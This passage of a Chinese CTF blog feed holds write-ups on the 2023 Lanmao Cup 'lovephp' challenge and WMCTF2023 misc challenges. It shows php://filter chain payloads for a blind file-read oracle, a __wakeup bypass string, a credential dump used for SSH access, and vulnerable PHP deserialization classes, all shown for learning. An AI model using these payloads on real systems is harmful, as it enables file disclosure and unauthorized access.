class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;8&#x27;</span><br><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:<br>letter = <span class="hljs-string">&#x27;9&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;wtf&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(end=letter)<br>o += letter<br>sys.stdout.flush()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">We are done!! :)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>()<br>d = b64decode(o.encode() + <span class="hljs-string">b&#x27;=&#x27;</span> * <span class="hljs-number">4</span>)<br><span class="hljs-comment"># remove KR padding</span><br>d = d.replace(<span class="hljs-string">b&#x27;$)C&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(b64decode(d))<br></code></pre></td></tr></table></figure><h2 id="2023蓝帽杯lovephp"><a href="#2023蓝帽杯lovephp" class="headerlink" title="2023蓝帽杯lovephp"></a>2023蓝帽杯lovephp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Saferman</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$check</span> = True;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;check === True)&#123;<br>            <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;secret&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;check=False;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;my_secret.flag&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;my_secret.flag&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>三处考点</p><p>参数名中的<code>[  </code> <code>. </code> <code>空格 </code> <code> +</code>都会被转化为下划线，但若先出现<code>[</code>后面的<code>.</code> 则不会转化</p><p>php7.4高版本绕过<code>__wakeup</code>魔术方法，使用<code>C:8:&quot;Saferman&quot;:0:&#123;&#125;</code>，C只能执行construct()函数或者destruct()函数，所以就被绕过了</p><p>file()函数是把文件内容放入数组</p><p>这里使用侧信道盲注，使用上一题的脚本，修改为get请求，带上参数即可</p><h2 id="对脚本内容的理解-链接放在最后）"><a href="#对脚本内容的理解-链接放在最后）" class="headerlink" title="对脚本内容的理解(链接放在最后）"></a>对脚本内容的理解(链接放在最后）</h2><h3 id="这部分讲的是脚本原理，可以不看"><a href="#这部分讲的是脚本原理，可以不看" class="headerlink" title="这部分讲的是脚本原理，可以不看"></a>这部分讲的是脚本原理，可以不看</h3><p>我们把侧信道的关键点称为oracle</p><h4 id="Part1-报错"><a href="#Part1-报错" class="headerlink" title="Part1 - 报错"></a>Part1 - 报错</h4><p>想到报错，我们一般是见到页面报错，而此处我们用到的是服务端报错即返回50xHTTP的状态码</p><p>如何找到服务端的oracle呢，脚本作者的方案是使用 <code>php filter</code> 配合 <code>convert.iconv.L1.UCS-4LE</code> 编码，经过多次该编码，达到某一程度就会使php产生内存错误</p><p><img src="/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/image-20230830185630646.png" alt="image-20230830185630646"></p><p>产生错误之后，我们想能不能找到一种带判断的编码，并且经过判断后能够使产生报错的代码不再报错，通过这样盲注获取信息</p><p>脚本作者在<a href="https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724">php filter dechunk</a> 部分发现，其对于字符的处理存在一个范围限制，只检查第一个字符是否在<code>a-fA-f0-9</code> 这个范围内，若是则输出空，若不是则输出原字符串</p><p><img src="/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/image-20230830191100214.png" alt="image-20230830191100214"></p><p>因此我们可以对字符串的第一个字符进行判断</p><p>这里给出参考文章的作者给出的案例，蓝色框和红色框对比是为了测出产生内存错误的临界情况（不同机器对于php产生内存错误的长度不同），红色框和绿色框对比用来判断第一个字符是否在范围内</p><p>但此处我有点疑惑，明明第一个字符是<code>U</code>（多加一次编码我测试的首字符是不变的）为什么能够通过检查，输出空字符串   （希望能够解答一下）</p><p><img src="/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/image-20230830191805947.png" alt="image-20230830191805947"></p><h3 id="Part2-交换字符"><a href="#Part2-交换字符" class="headerlink" title="Part2-交换字符"></a>Part2-交换字符</h3><p>由于dechunk只能对第一个字符做判断，于是想能不能找到交换字符顺序的编码形式</p><p>下面我们用<code>abcdefgh</code>八字节举例</p><p>使用 <code>convert.iconv.CSUNICODE.UCS-2BE</code> 我们可以前后交换每两个字节的位置，我们称这个编码规则为 <code>r2</code> </p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">php</span> &gt; <span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.UCS-2BE/resource=data:,abcdefgh&quot;</span>));</span><br><span class="hljs-function"><span class="hljs-title">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;badcfehg&quot;</span></span><br></code></pre></td></tr></table></figure><p>使用 <code>convert.iconv.UCS-4LE.10646-1:1993</code> 我们可以将每四个字节的位置逆序，我们称这个编码规则为 <code>r4</code> </p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">php</span> &gt; <span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefgh&quot;</span>));</span><br><span class="hljs-function"><span class="hljs-title">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;dcbahgfe&quot;</span></span><br></code></pre></td></tr></table></figure><p>第三位想要放到第一个，先经过r2，再经过一次r4即可</p><p>于是前半段我们都可以进行判断，但后半段我们没法利用r2和r4提到前面去</p><p>这里需要利用php在处理base64字符串会忽略非法字符。令字符串前面出现非法字符，然后利用交换规则，执行base64-decode，非法字符就被删除，后面字符就换到了前面去</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">##参考文章作者给出的例子<br><br><span class="hljs-comment">// 产生填充字符</span><br>php &gt; var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdef&quot;</span>)</span>);<br><span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;��abcdef&quot;</span><br><br><span class="hljs-comment">// 使用 r4 进行移位</span><br>php &gt; var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;</span>)</span>);<br><span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;ba��fedc&quot;</span><br><br><span class="hljs-comment">// 使用 base64 去掉冗余位</span><br>php &gt; var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdef&quot;</span>)</span>);<br><span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;bafedQ==&quot;</span><br><br><span class="hljs-comment">// 再次使用 r4 交换位置</span><br>php &gt; var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;</span>)</span>);<br><span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;efab==Qd&quot;</span><br></code></pre></td></tr></table></figure><p>文章的作者提出了他的细节，这里并没有使用 <code>abcdefgh</code> 8 字节为例，这是因为 <code>r4</code> 编码对于字节有要求，一定需要 4 字节为一组，而我们再产生 2 字节冗余之后会引起 <code>r4</code> 报错，使得 <code>r4</code> 编码失效，所以这里为了方便举例就没有使用 8 字节。</p><p>虽然是为了方便，但这也是需要解决的问题</p><h3 id="Part2-1-两个等号的处理"><a href="#Part2-1-两个等号的处理" class="headerlink" title="Part2.1 - 两个等号的处理"></a>Part2.1 - 两个等号的处理</h3><p>使用该filt将两个等号转换成24字节的字符串（至于为什么去看参考文章吧）</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos">php &gt; var_dump(file_get_contents(&quot;php://filter/<span class="hljs-built_in">convert</span>.quoted-printable-encode|<span class="hljs-built_in">convert</span>.quoted-printable-encode|<span class="hljs-built_in">convert</span>.iconv.L1.utf7|<span class="hljs-built_in">convert</span>.iconv.L1.utf7|<span class="hljs-built_in">convert</span>.iconv.L1.utf7|<span class="hljs-built_in">convert</span>.iconv.L1.utf7/resource=data:,==&quot;));<br>string(<span class="hljs-number">24</span>) &quot;+---AD0-<span class="hljs-number">3</span>D3D+---AD0-<span class="hljs-number">3</span>D3D&quot;<br></code></pre></td></tr></table></figure><p>算了，写不下去了（没有自己的理解，反正也是跟着文章作者走的），看完也不是很懂，还是看别人的优质文章吧</p><p><a href="https://tttang.com/archive/1755/">The End of AFR? - 跳跳糖 (tttang.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>WMCTF2023</title>
    <link href="/2023/08/24/WMCTF2023/"/>
    <url>/2023/08/24/WMCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="WMCTF2023（复现）"><a href="#WMCTF2023（复现）" class="headerlink" title="WMCTF2023（复现）"></a>WMCTF2023（复现）</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">WMCTF&#123;Welcome_W&amp;MCTF_2023!&#125;<br></code></pre></td></tr></table></figure><h3 id="Fantastic-terminal"><a href="#Fantastic-terminal" class="headerlink" title="Fantastic terminal"></a>Fantastic terminal</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">cat challenge<br><br><span class="hljs-comment">#WMCTF&#123;fanta3t1c_term1nal_1n_the_c0nta1ner_1n_the_br0w3er&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Fantastic-terminal-Rev"><a href="#Fantastic-terminal-Rev" class="headerlink" title="Fantastic terminal Rev"></a>Fantastic terminal Rev</h3><p>把程序base64 dump下来分析</p><p><img src="/2023/08/24/WMCTF2023/image-20230824113839462.png" alt="image-20230824113839462"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">c = <span class="hljs-string">&#x27;&#x27;&#x27;6120291406111F57</span><br><span class="hljs-string">37260D37353C3724</span><br><span class="hljs-string">330D3E333C633F20</span><br><span class="hljs-string">3127340D20372634</span><br><span class="hljs-string">3333220D353C6339</span><br><span class="hljs-string">3A3A3A3A3A3A3126</span><br><span class="hljs-string">2F3A3A3A3A3A3A3A&#x27;&#x27;&#x27;</span><br><br>c = c.split(<span class="hljs-string">&#x27;\\n&#x27;</span>)<br>c = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c]<br>e = []<br>flag =<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    d = []<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(i)//<span class="hljs-number">2</span>):<br>        d.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i[j*<span class="hljs-number">2</span>:j*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)^<span class="hljs-number">0x52</span>))<br>    d.reverse()<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> d:<br>        flag+=j<br>    <span class="hljs-comment"># e.append(d)</span><br><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#WMCTF&#123;r3venge_term1nal_after_fuck1ng_paatchhhhhhhhhhhhh&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Oversharing"><a href="#Oversharing" class="headerlink" title="Oversharing"></a>Oversharing</h3><p>导出SMB对象，保存dmp文件，使用minikatz分析获取ssh连接的密码</p><p><img src="/2023/08/24/WMCTF2023/image-20230824114110135.png" alt="image-20230824114110135"></p><p>看到ssh的password，<code>ssh randark@题目环境 -p 端口</code></p><p><img src="/2023/08/24/WMCTF2023/640.png" alt="图片"></p><p>然后获取flag</p><h3 id="find-me"><a href="#find-me" class="headerlink" title="find me"></a>find me</h3><p>题目描述前往<code>Reddit</code>寻找<code>WearyMeadow</code></p><p><img src="/2023/08/24/WMCTF2023/image-20230824114436116.png" alt="image-20230824114436116"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">aHR0cHM6Ly91ZmlsZS5pby82NzB1bnN6cA</span>==<br><br><span class="hljs-comment">#https://ufile.io/670unszp    (流量包下载链接)</span><br></code></pre></td></tr></table></figure><p>用户有个<code>my blog</code>连接，</p><p><img src="/2023/08/24/WMCTF2023/image-20230824114825505.png" alt="image-20230824114825505"></p><p>文章打开需要密码</p><p><code>WearyMeadow</code>在<code>Rebbit</code>的头像为<code>github</code>的初始头像，于是到<a href="github.com">github.com</a>上搜索该用户</p><p><img src="/2023/08/24/WMCTF2023/image-20230824115253229.png" alt="image-20230824115253229"></p><p>发现两个自动登录脚本，打开后发现密码</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">usernameStr</span> = <span class="hljs-string">&#x27;WearyMeadow&#x27;</span><br><span class="hljs-attr">passwordStr</span> = <span class="hljs-string">&#x27;P@sSW0rD123$%^&#x27;</span><br></code></pre></td></tr></table></figure><p>尝试用密码打开文章，成功解密，得到了server.py与client.py</p><p>分析逻辑写出decrypt函数的代码，（缺少key和数据）</p><p>wireshark分析流量包</p><p><img src="/2023/08/24/WMCTF2023/640-16928495892856.png" alt="图片"></p><p><img src="/2023/08/24/WMCTF2023/640-16928495954419.png" alt="图片"></p><p><img src="/2023/08/24/WMCTF2023/640-169284960612612.png" alt="图片"></p><p>说明<code>key</code>为<code>mysecretkey</code>，然后将该数据转化为原始数据</p><p><img src="/2023/08/24/WMCTF2023/640-169284963012315.png" alt="图片"></p><p>最长的一串应该还有flag信息</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs css"><br>import socket<br>import random<br><span class="hljs-selector-tag">from</span> Crypto<span class="hljs-selector-class">.Cipher</span> import AES<br><span class="hljs-selector-tag">from</span> sys import argv<br>import binascii<br><br>def pad(s):<br>    return s + b<span class="hljs-string">&quot;\0&quot;</span> * (AES.block_size - <span class="hljs-built_in">len</span>(s) % AES.block_size)<br><br>def <span class="hljs-built_in">encrypt</span>(message, key):<br>    seed = random.<span class="hljs-built_in">randint</span>(<span class="hljs-number">0</span>, <span class="hljs-number">11451</span>)<br>    random.<span class="hljs-built_in">seed</span>(seed)<br>    encrypted = b<span class="hljs-string">&#x27;&#x27;</span><br>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(message)):<br>        encrypted += <span class="hljs-built_in">bytes</span>([message[i] ^ random.<span class="hljs-built_in">randint</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])<br>    cipher = AES.<span class="hljs-built_in">new</span>(key, AES.MODE_ECB)<br>    encrypted = cipher.<span class="hljs-built_in">encrypt</span>(<span class="hljs-built_in">pad</span>(encrypted))<br>    return encrypted<br><br><br>key = b<span class="hljs-string">&#x27;mysecretkey&#x27;</span>.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">16</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(key)<br>hex_ciphertext = <span class="hljs-string">&quot;778f6cc13090c6a4f0b51939d784a6b38512f80a92b82bf8225fb8bfed713b2f8eee53dfbe228c7296449d904467a1677c83b9534e2dfcfcbc6f7b08f77f96f2&quot;</span><br><br>ciphertext = binascii.<span class="hljs-built_in">unhexlify</span>(hex_ciphertext)<br>cipher = AES.<span class="hljs-built_in">new</span>(key, AES.MODE_ECB)<br>decrypted_data = cipher.<span class="hljs-built_in">decrypt</span>(ciphertext)<br><span class="hljs-built_in">print</span>(decrypted_data)<br><br>unpadded = decrypted_data.<span class="hljs-built_in">rstrip</span>(b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(unpadded)<br><span class="hljs-built_in">print</span>()<br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">11451</span>):          #爆破种子<br>    seed = i<br>    random.<span class="hljs-built_in">seed</span>(seed)<br>    original_message = b<span class="hljs-string">&#x27;&#x27;</span><br>    for j in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(unpadded)):<br>        original_message += <span class="hljs-built_in">bytes</span>([unpadded[j] ^ random.<span class="hljs-built_in">randint</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)])<br>    # <span class="hljs-built_in">print</span>(original_message)<br>    if b<span class="hljs-string">&#x27;WMCTF&#x27;</span> in original_message:<br>        <span class="hljs-built_in">print</span>(original_message)<br>        <br>#b<span class="hljs-string">&#x27;well, here you are: WMCTF&#123;OH_Y0u_f1nd_Me__(@_@)&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>phar反序列化</title>
    <link href="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h2 id="GFCTF–文件查看器"><a href="#GFCTF–文件查看器" class="headerlink" title="GFCTF–文件查看器"></a>GFCTF–文件查看器</h2><p>本题目可在<a href="https://www.ctfer.vip/">NSSCTF</a>平台复现</p><p>目录扫描发现<code>www.zip</code></p><p><code>User.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;view/login.html&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>                <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>())&#123;<br>                    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location:./?c=Files&amp;m=read&quot;</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$this-&gt;username&#125;</span>的密码不正确或不存在该用户&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            (@<span class="hljs-variable language_">$this</span>-&gt;password)();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123; <br>            (<span class="hljs-variable">$name</span>)();<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p><code>Myerror.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;error_log&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/log/error.txt&#x27;</span>);<br>            <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;log_errors&#x27;</span>,<span class="hljs-number">1</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$test</span>=<span class="hljs-variable language_">$this</span>-&gt;message-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;test&#125;;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>Files.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable 